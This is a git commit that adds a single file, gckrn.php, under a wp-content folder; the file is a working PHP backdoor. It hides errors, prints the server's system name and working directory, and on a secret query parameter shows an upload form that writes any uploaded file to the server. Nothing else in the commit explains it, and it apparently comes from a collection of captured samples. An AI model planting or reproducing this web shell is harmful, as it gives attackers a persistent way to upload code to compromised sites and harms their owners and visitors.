34dd21db34b6244e3c4d1649c57fa0906aa58f65
Stefan Pejcic <pejcha1994@gmail.com>
2021-09-30 15:13:06 +0200

    Create gckrn.php

---
+++ 30.09.2021/wp-content/gckrn.php
@@ -0,0 +1,1 @@
+<?php error_reporting(0); echo php_uname()."<br>".getcwd()."<br>"; if($_GET['Fox'] == 'NaXyJ'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
